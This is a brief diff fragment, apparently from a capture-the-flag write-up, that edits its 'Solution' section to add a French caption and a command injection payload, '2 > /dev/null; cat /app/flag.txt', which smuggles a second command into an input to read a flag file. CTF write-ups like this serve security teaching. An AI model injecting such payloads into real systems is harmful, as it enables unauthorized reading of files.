@@ -14,9 +14,10 @@
 
 ## Solution
 
+Voici mon payload : 
 
 ```
- > /dev/null; cat /app/flag.txt
+2 > /dev/null; cat /app/flag.txt
 
 ```
 
